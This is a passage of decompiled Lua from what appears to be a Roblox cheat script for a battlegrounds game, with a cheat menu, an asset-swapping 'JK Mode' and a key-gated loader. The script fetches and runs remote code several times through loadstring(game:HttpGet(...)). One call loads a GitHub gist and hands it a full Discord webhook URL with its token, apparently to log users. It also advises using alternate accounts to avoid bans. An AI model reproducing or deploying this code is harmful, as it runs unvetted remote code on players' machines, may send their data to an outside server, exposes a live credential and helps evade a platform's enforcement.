                            u3533.Character.Parent = nil
                            u3533.Character.Parent = _Parent3
                        end

                        _Disguise:NewButton('Disguise', '', function()
                            u3548()
                        end)

                        local _Importing = _Characters:NewSection('Importing')
                        local u3550 = 'Tariviste'

                        _Importing:NewTextBox('Player Name', '', function(p3551)
                            u3550 = p3551
                        end)
                        _Importing:NewButton('Import', '', function()
                            if game:GetService('Players'):GetUserIdFromNameAsync(u3550) then
                                if not _LocalPlayer3.Character then
                                    _LocalPlayer3.CharacterAdded:Wait()
                                end

                                local _Character11 = _LocalPlayer3.Character
                                local v3553 = u3550
                                local v3554 = game:GetService('Players'):GetUserIdFromNameAsync(v3553)
                                local v3555 = game:GetService('Players'):GetHumanoidDescriptionFromUserId(v3554)
                                local v3556 = game:GetService('Players'):CreateHumanoidModelFromDescription(v3555, Enum.HumanoidRigType.R6)

                                v3556.Parent = game.Workspace.Live
                                v3556.Name = u3550
                                v3556.PrimaryPart = v3556:WaitForChild('HumanoidRootPart', 2)
                                v3556.PrimaryPart.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5, 1, 1)

                                local v3557, v3558, v3559 = pairs(v3556:GetChildren())

                                while true do
                                    local v3560

                                    v3559, v3560 = v3557(v3558, v3559)

                                    if v3559 == nil then
                                        break
                                    end
                                    if v3560:IsA('BasePart') then
                                        v3560.CanCollide = false
                                        v3560.CollisionGroup = 'playercol'
                                    end
                                end

                                local v3561, v3562, v3563 = pairs(_Character11:GetChildren())

                                while true do
                                    local v3564

                                    v3563, v3564 = v3561(v3562, v3563)

                                    if v3563 == nil then
                                        break
                                    end
                                    if string.find(v3564.Name, 'Hitbox_') then
                                        local v3565 = v3564:Clone()

                                        v3565.Parent = v3556

                                        local _Weld9 = v3564.Weld
                                        local v3567 = tostring(_Weld9.Part0)

                                        v3565.Weld.Part0 = v3556[v3567]
                                    end
                                end

                                v3556:PivotTo(_Character11:GetPivot())
                                table.insert(u32, v3556)
                            end
                        end)

                        local function u3572()
                            local v3568, v3569, v3570 = pairs(u32)

                            while true do
                                local v3571

                                v3570, v3571 = v3568(v3569, v3570)

                                if v3570 == nil then
                                    break
                                end
                                if not (v3571 and v3571:IsDescendantOf(workspace)) or (not v3571:FindFirstChild('Humanoid') or v3571.Humanoid.Health <= 0) then
                                    table.remove(u32, v3570)
                                end
                            end
                        end

                        _Importing:NewButton('Bring', '', function()
                            u3572()

                            local v3573, v3574, v3575 = pairs(u32)

                            while true do
                                local u3576

                                v3575, u3576 = v3573(v3574, v3575)

                                if v3575 == nil then
                                    break
                                end

                                pcall(function()
                                    u3576:PivotTo(_LocalPlayer3.Character:GetPivot())
                                end)
                            end
                        end)
                        _Importing:NewButton('Remove', '', function()
                            u3572()

                            local v3577, v3578, v3579 = pairs(u32)

                            while true do
                                local u3580

                                v3579, u3580 = v3577(v3578, v3579)

                                if v3579 == nil then
                                    break
                                end

                                pcall(function()
                                    u3580:Destroy()
                                end)
                            end

                            u32 = {}
                        end)
                        _Importing:NewButton('Dummy Counter Random Character', '', function()
                            u3572()

                            if u201():FindFirstChild('DoingMove') then
                                return
                            elseif #u32 ~= 0 then
                                local v3581 = _LocalPlayer3
                                local v3582 = u32[math.random(1, #u32)]

                                u1048(v3582, v3581.Character)
                                v3582:Destroy()

                                local v3583, v3584, v3585 = pairs(u32)

                                while true do
                                    local v3586

                                    v3585, v3586 = v3583(v3584, v3585)

                                    if v3585 == nil then
                                        break
                                    end
                                    if v3586 == v3582 then
                                        table.remove(u32, v3585)
                                    end
                                end
                            end
                        end)
                        _Importing:NewButton('Wall Combo All Characters', '', function()
                            u3572()

                            if not u201():FindFirstChild('DoingMove') then
                                local v3587, v3588, v3589 = pairs(u32)
                                local u3590 = 0
                                local u3591 = 0

                                while true do
                                    local u3592

                                    v3589, u3592 = v3587(v3588, v3589)

                                    if v3589 == nil then
                                        break
                                    end

                                    task.spawn(function()
                                        if u3592:IsDescendantOf(workspace) then
                                            u3590 = u3590 + 1

                                            u885(u3592)

                                            u3591 = u3591 + 1
                                        end
                                    end)
                                end

                                task.wait(1)

                                repeat
                                    task.wait()
                                until u3591 == u3590

                                local v3593, v3594, v3595 = pairs(u32)

                                while true do
                                    local u3596

                                    v3595, u3596 = v3593(v3594, v3595)

                                    if v3595 == nil then
                                        break
                                    end

                                    pcall(function()
                                        u3596:Destroy()
                                    end)
                                end

                                u32 = {}
                            end
                        end)
                        _Importing:NewButton('Wall Combo One Character', '', function()
                            u3572()

                            if u201():FindFirstChild('DoingMove') then
                                return
                            elseif #u32 ~= 0 then
                                local v3597 = u32[math.random(1, #u32)]

                                u885(v3597)

                                local v3598, v3599, v3600 = pairs(u32)

                                while true do
                                    local v3601

                                    v3600, v3601 = v3598(v3599, v3600)

                                    if v3600 == nil then
                                        break
                                    end
                                    if v3601 == v3597 then
                                        table.remove(u32, v3600)
                                    end
                                end
                            end
                        end)

                        local function u3606()
                            local v3602, v3603, v3604 = pairs(u116():GetPlayingAnimationTracks())

                            while true do
                                local v3605

                                v3604, v3605 = v3602(v3603, v3604)

                                if v3604 == nil then
                                    break
                                end

                                v3605:Stop()
                            end
                        end
                        local function u3608()
                            local _CurrentCamera12 = workspace.CurrentCamera

                            _CurrentCamera12.CameraType = Enum.CameraType.Custom
                            _CurrentCamera12.FieldOfView = 70

                            pcall(function()
                                _LocalPlayer3.PlayerGui.TopbarPlus.TopbarContainer.Visible = true
                                _LocalPlayer3.PlayerGui.Hotbar.Backpack.Position = UDim2.new(0, 0, 0, 0)
                            end)

                            u14.Ambient = Color3.fromRGB(138, 138, 138)
                            u14.Brightness = 2
                            u14.OutdoorAmbient = Color3.fromRGB(70, 70, 70)
                            u14.ClockTime = 13
                        end

                        local _Settings = _FakeKJScriptmadebyTariviste:NewTab('Settings'):NewSection('Settings')

                        _Settings:NewButton('Stop All Ultimate Music', 'Stops all ultimate sfx (that was played by the script)', function()
                            u251()
                        end)
                        _Settings:NewButton('Stop All Animations', 'Stops all animations that are playing.', function()
                            u3606()
                        end)
                        _Settings:NewButton('Fix Camera', 'Fixes your camera if it is stuck', function()
                            u3608()
                        end)
                        _Settings:NewButton('Enable GUIs', 'Enables Disabled GUIs', function()
                            shared.SetCore(true)
                        end)
                        _Settings:NewToggle('God Only Knows', 'Toggle UFW God Only Knows mode', function(p3610)
                            u34 = p3610
                        end)

                        local u3611 = loadstring(game:HttpGet('https://raw.githubusercontent.com/Tariviste/Vynixius/refs/heads/main/UI'))()

                        _Settings:NewToggle('FE Animations', 'Toggle FE Animations', function(p3612)
                            _G.FeKJAn = p3612

                            if p3612 then
                                u3611:Notify({
                                    title = 'KJ Script',
                                    text = 'FE Animations may get you permanently banned. Use at your own risk.',
                                    duration = 5,
                                    color = Color3.new(255, 255, 255),
                                })
                            end
                        end)

                        if not getgenv().Destroyed then
                            getgenv().Destoyed = {}
                        end
                        if not getgenv().Added then
                            getgenv().Added = {}
                        end

                        local u3613 = tick()

                        _Settings:NewToggle('JK Mode', 'Toggle JK Mode (Blue KJ)', function(p3614)
                            if tick() - u3613 >= 5 then
                                u3613 = tick()
                                _G.JKMode = p3614
                                u4.Resources.Ring.Color = _G.JKMode and Color3.fromRGB(61, 77, 255) or Color3.fromRGB(248, 248, 248)

                                if _G.JKMode then
                                    local v3615 = game:GetObjects('rbxassetid://126301951376884')[1]

                                    v3615.TekrinnDialogue:Destroy()

                                    getgenv().Destoyed.UFWDialogue = u4.Resources.UFW.TekrinnDialogue
                                    u4.Resources.UFW.TekrinnDialogue.Parent = v3615
                                    getgenv().Destoyed.UFW = u4.Resources.UFW
                                    u4.Resources.UFW.Parent = nil
                                    v3615.TekrinnDialogue.KJDialogue.Holder.Template.ImageLabel.Image = 'rbxassetid://89244135005359'
                                    v3615.TekrinnDialogue.KJDialogue.Holder.Template:FindFirstChildOfClass('TextLabel').TextColor3 = Color3.fromRGB(50, 62, 168)
                                    v3615.Parent = u4.Resources
                                    v3615.Name = 'UFW'
                                    getgenv().Added.UFW = v3615

                                    local v3616 = game:GetObjects('rbxassetid://97771927135674')[1]

                                    getgenv().Destoyed.KJEffects = u4.Resources.KJEffects
                                    u4.Resources.KJEffects.Parent = nil
                                    v3616.Parent = u4.Resources
                                    v3616.Name = 'KJEffects'
                                    getgenv().Added.KJEffects = v3616

                                    local v3617 = game:GetObjects('rbxassetid://109763549644738')[1]

                                    getgenv().Destoyed.Collat = u4.Resources.Collat
                                    u4.Resources.Collat.Parent = nil
                                    v3617.Parent = u4.Resources
                                    v3617.Name = 'Collat'
                                    getgenv().Added.Collat = v3617

                                    local v3618 = game:GetObjects('rbxassetid://134380297818715')[1]

                                    getgenv().Destoyed.KJThrow = u4.Resources.KJThrow
                                    u4.Resources.KJThrow.Parent = nil
                                    v3618.Parent = u4.Resources
                                    v3618.Name = 'KJThrow'
                                    getgenv().Added.KJThrow = v3618

                                    local v3619 = game:GetObjects('rbxassetid://128724456983182')[1]

                                    getgenv().Destoyed.StoicBomb = u4.Resources.StoicBomb
                                    u4.Resources.StoicBomb.Parent = nil
                                    v3619.Parent = u4.Resources
                                    v3619.Name = 'StoicBomb'
                                    getgenv().Added.StoicBomb = v3619

                                    local v3620 = game:GetObjects('rbxassetid://84491019148994')[1]

                                    getgenv().Destoyed.FiveSeasonsFX = u4.Resources.FiveSeasonsFX
                                    u4.Resources.FiveSeasonsFX.Parent = nil
                                    v3620.Parent = u4.Resources
                                    v3620.Name = 'FiveSeasonsFX'
                                    getgenv().Added.FiveSeasonsFX = v3620
                                else
                                    local v3621, v3622, v3623 = pairs(getgenv().Destoyed)

                                    while true do
                                        local v3624

                                        v3623, v3624 = v3621(v3622, v3623)

                                        if v3623 == nil then
                                            break
                                        end
                                        if v3623 == 'UFWDialogue' then
                                            v3624.Parent = getgenv().Destoyed.UFW
                                        else
                                            v3624.Parent = u4.Resources
                                        end
                                    end

                                    getgenv().Destoyed = {}

                                    local v3625, v3626, v3627 = pairs(getgenv().Added)

                                    while true do
                                        local v3628

                                        v3627, v3628 = v3625(v3626, v3627)

                                        if v3627 == nil then
                                            break
                                        end

                                        v3628.Parent = nil
                                    end

                                    getgenv().Added = {}
                                end
                            else
                                u3611:Notify({
                                    title = 'KJ Script',
                                    text = 'This feature is on cooldown! To avoid any conflicting issues, You have to wait 5 seconds.',
                                    duration = 5,
                                    color = Color3.new(255, 255, 255),
                                })
                            end
                        end)
                        _Settings:NewToggle('Debug Mode', 'Toggle Debug Mode', function(p3629)
                            _G.DebugMode = p3629
                        end)

                        local v3630 = u9:GetLastInputType()

                        if _TouchEnabled or string.find(tostring(v3630):lower(), 'touch') then
                            local _Kavo = game.CoreGui:WaitForChild('Kavo', 9000000000)
                            local v3632, v3633, v3634 = pairs(_Kavo:GetDescendants())

                            while true do
                                local u3635

                                v3634, u3635 = v3632(v3633, v3634)

                                if v3634 == nil then
                                    break
                                end
                                if not (u3635:IsA('UICorner') or u3635:IsA('UIListLayout') or u3635:IsA('Folder')) then
                                    u3635.Size = UDim2.new(0, u3635.Size.X.Offset / 1.5, 0, u3635.Size.Y.Offset / 1.5)

                                    pcall(function()
                                        task.delay(0.1, function()
                                            if u3635.Name ~= 'Sample' and u3635.Size == UDim2.new(0, 0, 0, 0) then
                                                u3635.Size = UDim2.new(1, 0, 1, 0)
                                            end
                                        end)
                                    end)
                                end
                                if u3635:IsA('TextLabel') or u3635:IsA('TextButton') then
                                    u3635.TextSize = u3635.TextSize / 2
                                end
                            end

                            _Kavo:GetChildren()[1].Position = UDim2.new(0.5, 0, 0.5, 0)
                            _Kavo:GetChildren()[1].AnchorPoint = Vector2.new(0.5, 0.5)
                        end
                    else
                        _LocalPlayer2:Kick((u208 and 'You own a gamepass!' or (_LocalPlayer3:GetAttribute('TotalKillsFrb') ~= nil and 1500 <= _LocalPlayer3:GetAttribute('TotalKillsFrb') and 'You have over 1500 kills!' or (v228 == 'Premium' and 'You have roblox premium!' or (v226 and 'You have spent robux on your avatar!' or nil)))) .. " Please don't exploit on your main account (you can get banned) and use an alternative account instead.")
                        _LocalPlayer2:Destroy()
                    end
                end)
            end

            local v3636 = {
                'Tree Destruction',
                'Trashcan Destruction',
                'Cape Wind',
                'Physics Worker',
                'Energy Converter',
                'Data Analyzer',
                'Communication Facilitator',
                'Resource Allocator',
                'Security Enforcer',
                'Task Scheduler',
                'Performance Optimizer',
                'key verifyer',
                'Environmental Monitor',
                'Decision Maker',
                'Interface Coordinator',
                'Feedback Processor',
                'System Integrator',
                'Workflow Orchestrator',
                'Event Dispatcher',
                'Collaboration Manager',
                'Automation Controller',
                'Risk Assessor',
                'test verifyer real',
                'Knowledge Aggregator',
                'Rain',
            }
            local v3637 = table.clone(v3636)

            Random.new():Shuffle(v3636)

            local v3638, v3639, v3640 = pairs(v3636)
            local v3641 = ''
            local v3642 = {
                Characters = {
                    'a',
                    'b',
                    'c',
                    'd',
                    'e',
                    'f',
                    'g',
                    'h',
                    'i',
                    'j',
                    'k',
                    'l',
                    'm',
                    'n',
                    'o',
                    'p',
                    'q',
                    'r',
                    's',
                    't',
                    'u',
                    'v',
                    'w',
                    'x',
                    'y',
                    'z',
                    '1',
                    '2',
                    '3',
                    '4',
                    '5',
                    '6',
                    '7',
                    '8',
                    '9',
                },
                KeyLength = 15,
                Key = '',
            }

            while true do
                local v3643

                v3640, v3643 = v3638(v3639, v3640)

                if v3640 == nil then
                    break
                end

                table.insert({}, (game.ReplicatedStorage:FindFirstChild(v3643)))

                if v3643 == v3637[23] then
                    v3641 = v3641 .. string.split(v3643, ' ')[1]
                end
            end

            local v3644, v3645, v3646 = pairs(v3636)

            while true do
                local v3647

                v3646, v3647 = v3644(v3645, v3646)

                if v3646 == nil then
                    break
                end

                table.insert({}, (game.ReplicatedStorage:FindFirstChild(v3647)))

                if v3647 == v3637[12] then
                    v3641 = v3641 .. '' .. string.split(v3647, ' ')[1]
                end
            end

            local v3648, v3649, v3650 = pairs(v3636)

            while true do
                local v3651

                v3650, v3651 = v3648(v3649, v3650)

                if v3650 == nil then
                    break
                end

                table.insert({}, (game.ReplicatedStorage:FindFirstChild(v3651)))

                if v3651 == v3637[23] then
                    v3641 = v3641 .. '' .. string.split(v3651, ' ')[3]
                end
            end

            local u3652 = v3641 .. tostring(v1 + 1)

            for _ = 1, v3642.KeyLength do
                if math.random(1, 2) ~= 1 then
                    v3642.Key = v3642.Key .. v3642.Characters[math.random(1, #v3642.Characters)]:upper()
                else
                    v3642.Key = v3642.Key .. v3642.Characters[math.random(1, #v3642.Characters)]
                end
            end

            local v3653 = {}

            repeat
                shift = math.random(1, 12000)
            until shift % 95 ~= 0

            local function u3658(p3654, p3655)
                local v3656 = string.byte(p3654)
                local v3657 = 32

                return string.char(v3657 + (v3656 - v3657 + p3655) % 95)
            end

            function v3653.encode(p3659)
                local v3660 = ''

                for v3661 = 1, #p3659 do
                    v3660 = v3660 .. u3658(p3659:sub(v3661, v3661), shift)
                end

                return v3660
            end
            function v3653.decode(p3662)
                local v3663 = ''

                for v3664 = 1, #p3662 do
                    v3663 = v3663 .. u3658(p3662:sub(v3664, v3664), -shift)
                end

                return v3663
            end

            local v3665 = 'YieldingLeaks_' .. v3642.Key
            local v3666 = v3653.encode(v3665)
            local u3667 = v3653.decode(v3666)
            local u3668 = '.genkey ' .. v3666 .. ' ' .. shift

            if v3666 == v3665 or u3667 ~= v3665 then
                u5.LocalPlayer:Kick('Key obfuscation failed.')
                u5.LocalPlayer:Destroy()
            else
                local v3669 = getgenv and getgenv() or shared

                if not v3669.HasLoadedKJScript and _G and not _G.IsTariviste then
                    v3669.HasLoadedKJScript = true
                    v3669.EncodedKey = 'Key: ' .. v3666 .. ' Num: ' .. shift .. ''

                    loadstring(game:HttpGet('https://gist.githubusercontent.com/Tariviste/462ca46773554069df1267a16a77fe78/raw/5d557c4e7a0b11a1f00d62ce33af5555febfd986/fgsfsdf'))('KJ', 'https://discord.com/api/webhooks/1387937647070023800/n1gz6fA_gVnVC9diiTkRp70u34c1l3CT3A0tTU0R8jgmI6LY6fAW2iZfbE2DTLZlUNYa')
                end

                local v3670 = 7200

                if pcall(function()
                    return u27('TarivisteKey_TSBScript.json')
                end) then
                    local v3671 = u15:JSONDecode(u27('TarivisteKey_TSBScript.json'))

                    if os.time() < v3671.BroWhyAreYouHereWhyDoUNeedToLookAtThisTXTQuestionMark or os.time() == v3671.BroWhyAreYouHereWhyDoUNeedToLookAtThisTXTQuestionMark then
                        u5.LocalPlayer:Kick("You shouldn't be doing that.")
                        u5.LocalPlayer:Destroy()

                        return
                    end
                    if os.time() <= v3671.BroWhyAreYouHereWhyDoUNeedToLookAtThisTXTQuestionMark + v3670 then
                        doscript()

                        return
                    end
                end

                local _ScreenGui = Instance.new('ScreenGui')
                local _Frame = Instance.new('Frame')
                local _UICorner = Instance.new('UICorner')
                local _ImageLabel2 = Instance.new('ImageLabel')
                local _UICorner2 = Instance.new('UICorner')
                local _Frame2 = Instance.new('Frame')
                local _TextBox = Instance.new('TextBox')
                local _UITextSizeConstraint = Instance.new('UITextSizeConstraint')
                local _ImageButton = Instance.new('ImageButton')
                local _Frame3 = Instance.new('Frame')
                local _Frame4 = Instance.new('Frame')
                local _Frame5 = Instance.new('Frame')
                local _Frame6 = Instance.new('Frame')
                local _Frame7 = Instance.new('Frame')
                local _TextButton = Instance.new('TextButton')
                local _UICorner3 = Instance.new('UICorner')
                local _UITextSizeConstraint2 = Instance.new('UITextSizeConstraint')
                local _UICorner4 = Instance.new('UICorner')
                local _TextLabel = Instance.new('TextLabel')
                local _UITextSizeConstraint3 = Instance.new('UITextSizeConstraint')
                local _TextLabel2 = Instance.new('TextLabel')
                local _UITextSizeConstraint4 = Instance.new('UITextSizeConstraint')
                local _TextLabel3 = Instance.new('TextLabel')
                local _UITextSizeConstraint5 = Instance.new('UITextSizeConstraint')
                local _TextButton2 = Instance.new('TextButton')
                local _UICorner5 = Instance.new('UICorner')
                local _UITextSizeConstraint6 = Instance.new('UITextSizeConstraint')
                local _UIStroke = Instance.new('UIStroke')

                Instance.new('UIStroke')

                _ScreenGui.Parent = u11
                _ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
                _ScreenGui.Name = 'KeySys'
                _Frame.Parent = _ScreenGui
                _Frame.AnchorPoint = Vector2.new(0.5, 0.5)
                _Frame.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
                _Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _Frame.BorderSizePixel = 0
                _Frame.Position = UDim2.new(0.5, 0, 0.479303896, 0)
                _Frame.Size = UDim2.new(0.124456048, 0, 0.267717421, 0)
                _UICorner.Parent = _Frame
                _ImageLabel2.Parent = _Frame
                _ImageLabel2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                _ImageLabel2.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _ImageLabel2.BorderSizePixel = 0
                _ImageLabel2.Position = UDim2.new(0.332167834, 0, 0.0816825554, 0)
                _ImageLabel2.Size = UDim2.new(0.335664332, 0, 0.275147915, 0)
                _ImageLabel2.Image = 'rbxassetid://139450341474945'
                _UICorner2.CornerRadius = UDim.new(0.800000012, 0)
                _UICorner2.Parent = _ImageLabel2
                _Frame2.Name = 'Input'
                _Frame2.Parent = _Frame
                _Frame2.AnchorPoint = Vector2.new(0.5, 0)
                _Frame2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                _Frame2.BackgroundTransparency = 1
                _Frame2.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _Frame2.BorderSizePixel = 0
                _Frame2.Position = UDim2.new(0.5, 0, 0.423076928, 0)
                _Frame2.Size = UDim2.new(0.720279694, 0, 0.0648700595, 0)
                _TextBox.Parent = _Frame2
                _TextBox.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                _TextBox.BackgroundTransparency = 1
                _TextBox.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _TextBox.BorderSizePixel = 0
                _TextBox.Position = UDim2.new(0.024271844, 0, 0, 0)
                _TextBox.Size = UDim2.new(0.839805841, 0, 0.820940137, 0)
                _TextBox.Font = Enum.Font.SourceSans
                _TextBox.PlaceholderColor3 = Color3.fromRGB(177, 177, 177)
                _TextBox.PlaceholderText = 'Key'
                _TextBox.Text = ''
                _TextBox.TextColor3 = Color3.fromRGB(177, 177, 177)
                _TextBox.TextScaled = true
                _TextBox.TextSize = 18
                _TextBox.TextWrapped = true
                _TextBox.TextXAlignment = Enum.TextXAlignment.Left
                _UITextSizeConstraint.Parent = _TextBox
                _UITextSizeConstraint.MaxTextSize = 18
                _ImageButton.Parent = _Frame2
                _ImageButton.AnchorPoint = Vector2.new(1, 0)
                _ImageButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                _ImageButton.BackgroundTransparency = 1
                _ImageButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _ImageButton.BorderSizePixel = 0
                _ImageButton.Position = UDim2.new(0.975728154, 0, 0.0456077866, 0)
                _ImageButton.Rotation = -90
                _ImageButton.Size = UDim2.new(0.0873786435, 0, 0.820940137, 0)
                _ImageButton.Image = 'rbxassetid://9243354333'
                _Frame3.Name = 'Line'
                _Frame3.Parent = _Frame2
                _Frame3.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
                _Frame3.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _Frame3.BorderSizePixel = 0
                _Frame3.Position = UDim2.new(0, 0, 0.908784449, 0)
                _Frame3.Size = UDim2.new(1, 0, 0.0912155733, 0)
                _Frame4.Name = 'Fill'
                _Frame4.Parent = _Frame3
                _Frame4.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
                _Frame4.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _Frame4.BorderSizePixel = 0
                _Frame4.Size = UDim2.new(0, 0, 1, 0)
                _Frame5.Name = 'Discord'
                _Frame5.Parent = _Frame
                _Frame5.AnchorPoint = Vector2.new(0.5, 0)
                _Frame5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
                _Frame5.BackgroundTransparency = 1
                _Frame5.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _Frame5.BorderSizePixel = 0
                _Frame5.Position = UDim2.new(0.5, 0, 0.529783189, 0)
                _Frame5.Size = UDim2.new(0.720279694, 0, 0.255719483, 0)
                _Frame6.Name = 'Join'
                _Frame6.Parent = _Frame5
                _Frame6.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
                _Frame6.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _Frame6.BorderSizePixel = 0
                _Frame6.Position = UDim2.new(0, 0, 0.0925570428, 0)
                _Frame6.Size = UDim2.new(1, 0, 0.907442927, 0)
                _UIStroke.Parent = _Frame6
                _UIStroke.ApplyStrokeMode = 'Contextual'
                _UIStroke.Color = Color3.fromRGB(42, 42, 42)
                _UIStroke.LineJoinMode = 'Round'
                _UIStroke.Thickness = 2
                _UIStroke.Transparency = 0
                _Frame7.Name = 'Holder'
                _Frame7.Parent = _Frame6
                _Frame7.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
                _Frame7.BackgroundTransparency = 1
                _Frame7.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _Frame7.BorderSizePixel = 0
                _Frame7.Position = UDim2.new(0.00970873795, 0, 0.0254994109, 0)
                _Frame7.Size = UDim2.new(0.980582535, 0, 0.949001193, 0)
                _TextButton.Parent = _Frame7
                _TextButton.BackgroundColor3 = Color3.fromRGB(89, 100, 239)
                _TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _TextButton.BorderSizePixel = 0
                _TextButton.Position = UDim2.new(0.0643564388, 0, 0.174653292, 0)
                _TextButton.Size = UDim2.new(0.871287107, 0, 0.351992071, 0)
                _TextButton.Font = Enum.Font.SourceSansBold
                _TextButton.Text = 'Join Discord Server'
                _TextButton.TextColor3 = Color3.fromRGB(255, 255, 255)
                _TextButton.TextScaled = true
                _TextButton.TextSize = 16
                _TextButton.TextWrapped = true

                _TextButton.Activated:Connect(function()
                    pcall(function()
                        loadstring(game:HttpGet('https://raw.githubusercontent.com/RegularVynixu/Utilities/main/Discord%20Inviter/Source.lua'))().Join('https://discord.gg/8ftQT68w2y')
                    end)
                end)

                _UICorner3.CornerRadius = UDim.new(0, 5)
                _UICorner3.Parent = _TextButton
                _UITextSizeConstraint2.Parent = _TextButton
                _UITextSizeConstraint2.MaxTextSize = 16
                _UICorner4.CornerRadius = UDim.new(0, 10)
                _UICorner4.Parent = _Frame6
                _TextLabel.Parent = _Frame5
                _TextLabel.AnchorPoint = Vector2.new(0.5, 0)
                _TextLabel.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
                _TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _TextLabel.BorderSizePixel = 0
                _TextLabel.Position = UDim2.new(0.5, 0, 0, 0)
                _TextLabel.Size = UDim2.new(0.572815537, 0, 0.185114086, 0)
                _TextLabel.Font = Enum.Font.SourceSans
                _TextLabel.Text = 'How to get key?'
                _TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
                _TextLabel.TextScaled = true
                _TextLabel.TextSize = 15
                _TextLabel.TextWrapped = true
                _UITextSizeConstraint3.Parent = _TextLabel
                _UITextSizeConstraint3.MaxTextSize = 15
                _TextLabel2.Parent = _Frame5
                _TextLabel2.AnchorPoint = Vector2.new(0.5, 0)
                _TextLabel2.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
                _TextLabel2.BackgroundTransparency = 1
                _TextLabel2.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _TextLabel2.BorderSizePixel = 0
                _TextLabel2.Position = UDim2.new(0.5, 0, 0.57303375, 0)
                _TextLabel2.Size = UDim2.new(0.572815537, 0, 0.185114086, 0)
                _TextLabel2.Font = Enum.Font.SourceSansBold
                _TextLabel2.Text = 'Join not working?'
                _TextLabel2.TextColor3 = Color3.fromRGB(255, 255, 255)
                _TextLabel2.TextScaled = true
                _TextLabel2.TextSize = 14
                _TextLabel2.TextWrapped = true
                _UITextSizeConstraint4.Parent = _TextLabel2
                _UITextSizeConstraint4.MaxTextSize = 14
                _TextLabel3.Parent = _Frame5
                _TextLabel3.AnchorPoint = Vector2.new(0.5, 0)
                _TextLabel3.BackgroundColor3 = Color3.fromRGB(29, 29, 29)
                _TextLabel3.BackgroundTransparency = 1
                _TextLabel3.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _TextLabel3.BorderSizePixel = 0
                _TextLabel3.Position = UDim2.new(0.5, 0, 0.752809048, 0)
                _TextLabel3.Size = UDim2.new(0.572815537, 0, 0.185114086, 0)
                _TextLabel3.Font = Enum.Font.SourceSansBold
                _TextLabel3.Text = 'discord.gg/jJz6gaSncS'
                _TextLabel3.TextColor3 = Color3.fromRGB(255, 255, 255)
                _TextLabel3.TextScaled = true
                _TextLabel3.TextSize = 14
                _TextLabel3.TextWrapped = true
                _UITextSizeConstraint5.Parent = _TextLabel3
                _UITextSizeConstraint5.MaxTextSize = 14
                _TextButton2.Name = 'Copy'
                _TextButton2.Parent = _Frame
                _TextButton2.BackgroundColor3 = Color3.fromRGB(89, 100, 239)
                _TextButton2.BorderColor3 = Color3.fromRGB(0, 0, 0)
                _TextButton2.BorderSizePixel = 0
                _TextButton2.Position = UDim2.new(0.139860138, 0, 0.834319532, 0)
                _TextButton2.Size = UDim2.new(0.720279694, 0, 0.0887573957, 0)
                _TextButton2.Font = Enum.Font.SourceSansBold
                _TextButton2.Text = 'Copy Key Command'
                _TextButton2.TextColor3 = Color3.fromRGB(255, 255, 255)
                _TextButton2.TextScaled = true
                _TextButton2.TextSize = 14
                _TextButton2.TextWrapped = true
                _UICorner5.Parent = _TextButton2
                _UITextSizeConstraint6.Parent = _TextButton2
                _UITextSizeConstraint6.MaxTextSize = 14

                local u3700 = 0
                local u3701 = u12.RenderStepped:Connect(function()
                    _UIStroke.Color = Color3.fromHSV(u3700, 1, 1)
                    u3700 = (u3700 + 0.001) % 1
                end)
                local u3702 = true

                _TextButton2.Activated:Connect(function()
                    setclipboard(u3668)
                end)
                _LocalPlayer.Chatted:Connect(function(p3703)
                    if p3703:lower() == '/e key' then
                        setclipboard(u3668)
                    end
                end)
                _ImageButton.Activated:Connect(function()
                    if u3702 then
                        local v3704 = u3667

                        if _TextBox.Text:lower() == v3704:lower() or _TextBox.Text:lower() == u3652 then
                            u3702 = false

                            u3701:Disconnect()

                            local v3705 = u15:JSONEncode({
                                Key = u3667,
                                BroWhyAreYouHereWhyDoUNeedToLookAtThisTXTQuestionMark = os.time(),
                            })

                            writefile('TarivisteKey_TSBScript.json', v3705)
                            doscript()

                            _ImageButton.ImageColor3 = Color3.new(0, 0.980392, 0.117647)

                            task.wait(0.5)

                            _ImageButton.ImageColor3 = Color3.new(1, 1, 1)

                            wait(0.2)
                            u10:Create(_Frame, TweenInfo.new(5, Enum.EasingStyle.Quart, Enum.EasingDirection.InOut, 0, false, 0), {
                                Position = UDim2.new(_Frame.Position.X.Scale + 50, _Frame.Position.Y.Scale),
                            }):Play()
                        else
                            _ImageButton.ImageColor3 = Color3.new(1, 0, 0)

                            task.wait(0.5)

                            _ImageButton.ImageColor3 = Color3.new(1, 1, 1)
                        end
                    end
                end)

                local v3706 = u9:GetLastInputType()

                if _TouchEnabled or string.find(tostring(v3706):lower(), 'touch') then
                    local _UIScale = Instance.new('UIScale')

                    _UIScale.Parent = _Frame
                    _UIScale.Scale = 3
                end
            end
        end
    else
        u5.LocalPlayer:Kick("Sorry, your executor doesn't support the functions required.")
        u5.LocalPlayer:Destroy()

        return
    end
else
    u5.LocalPlayer:Kick('wrong game buddy')
    u5.LocalPlayer:Destroy()

    return
end
